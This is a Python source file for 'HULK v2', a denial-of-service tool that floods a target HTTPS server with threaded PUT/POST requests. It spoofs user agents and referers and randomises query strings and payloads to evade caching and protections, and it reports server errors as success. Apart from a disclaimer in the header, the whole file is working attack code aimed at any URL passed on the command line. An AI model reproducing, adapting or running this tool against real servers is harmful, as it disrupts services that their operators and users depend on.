# -------------------------------------------------------------------------------------------- #
# HULK v2 - HTTPS Unbearable Load King
#
# This script is a Denial of Service tool that is can put heavy load on HTTPS servers,
# in order to bring them to their knees, by exhausting the resource pool.
# Its is meant for research purposes only and any malicious usage of this tool is prohibited.
# The authors aren't to be held responsible for any consequence of usage of this tool.
#
# Edited and improved by Hyperclaw79 for smoother working and PY3+ compatibility.
#
# Works for Python 3.5. No backward compatiblity.
#
# Run pip install -r requirements.txt before starting this script.
#
# Edits: 1)Syntax Corrections.
#        2)Replaced urllib2 module with requests module.
#        3)Replaced support for Http with support for Https.
#        4)Added more HTTP Status Error Codes for detection and control.
#        5)Randomized buildblock size a bit more.
#        6)Deprecated 'safe'.
#        7)Improved Documentation.
#        8)Added Threadpooling.
#        9) Payload Obfuscation.
#
# Authors : Hyperclaw79, version 2.0; Barry Shteiman , version 1.0
# -------------------------------------------------------------------------------------------- #

import requests               # Because it's faster and more powerful than urllib2
import sys
import threading
import random
import re
import time                   # For time.sleep

from queue import Queue

# Global Params
global urlc
urlc=''                       # To prevent conflict with url keyword of requests module  
host=''
headers_useragents=[]
headers_referers=[]
global request_counter
request_counter=0
flag=0
q = Queue()
global dt
dt = []
global status
status = ""
global fault
fault = 0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# Generates a List of UserAgent headers.
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# Generates a List of Referer headers.
def referer_list():
	global headers_referers
	headers_referers.append('https://www.google.com/?q=')
	headers_referers.append('https://www.usatoday.com/search/results?q=')
	headers_referers.append('https://engadget.search.aol.com/search?q=')
	headers_referers.append('https://' + host + '/')
	return(headers_referers)
	
# Generates random ascii string of given size.
def buildblock(size):
	out_str = ''
	for i in range(size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

# User Instructions
def usage():
	print('---------------------------------------------------')
	print('USAGE: python hulk.py <url>')
	print('Example: python hulk.py https://abcxyz123.com')
	print('---------------------------------------------------')

def corrupt():		
	for i in range(500):
		dt.append(buildblock(random.randint(1,10)) + '\a' + buildblock(random.randint(1,10)))
	
# Main Function that sends a HTTPS request.
def httpcall(urlc):
	useragent_list()
	referer_list()
	code=0
	global request_counter
	global fault
	global status
	global dt
	
	if urlc.count("?")>0:          # For Quering type urls
		param_joiner="&"
	else:
		param_joiner="?"

	HeaderDict = {'User-Agent': random.choice(headers_useragents),'Cache-Control': 'no-cache','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','Referer': random.choice(headers_referers) + buildblock(random.randint(random.randint(0,5),random.randint(6,10))),'Keep-Alive': str(random.randint(110,120)),'Connection': 'keep-alive','Host':host}
	urlreq = urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10)))

	try:
		try:
			r = requests.put(url=urlreq,headers=HeaderDict,data=dt[request_counter],timeout=(15,30))
		except:
			r = requests.post(url=urlreq,headers=HeaderDict,data=dt[request_counter],timeout=(15,30))

		if (str(r.status_code)=='500') or (str(r.status_code)=='503') or (str(r.status_code)=='504'):
			set_flag(1)
			print('Successful.')
			code=500
		elif str(r.status_code)=='400':
			print('Url has DDoS protection.')
			sys.exit()
		elif str(r.status_code)=='404':
			print('Url does not exist.')
			sys.exit()
		elif str(r.status_code)=='429':
			print('Slowing down due to "Too many requests" error.')
			time.sleep(5)
		elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):       # For other unexpected HTTPS errors, prints the error code. 
			print(str(r.status_code))
		elif request_counter >= 500:
			code = "Done"
		else:
			print('Sending crafted request: %s' % urlreq,flush=True)
			inc_counter()
			
	except Exception as e:
		print(str(e))
		request_counter-=1
		fault+=1

	return(code)		

# Queueing Threads to work with httpcall. 
def dosExec():
	while flag<2:
		urlc = q.get()
		code = httpcall(urlc)
		if code==500:
			set_flag(2)
			status="successly. "
			q.task_done()
			return
		elif code == "Done":
			set_flag(2)
			status="but failed. "
			q.task_done()
			return
		q.task_done()
		print("%d Requests Sent" % request_counter,flush=True)
	return

# Main code. 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print("-- HULK Attack Started --")
		print("Current Version: 2.1")
		print("Compatible with: Python 3")
		print("Edited by: Hyperclaw79")
		urlc = sys.argv[1]
		if urlc.count("/")==2:
			urlc = urlc + "/"
		m = re.search('https\://([^/]*)/?.*', urlc)  
		host = m.group(1)
		corrupt()
		for i in range(500+fault):
			t = threading.Thread(target=dosExec)
			t.daemon = True
			t.start()

		count = 0
		for i in range(500+fault):
			q.put(urlc)
			count+=1
			if count == 250:
				time.sleep(0.1)
				count = 0
			
		q.join()
		print("\n-- HULK v2.1 Attack Finished %s--" % status)
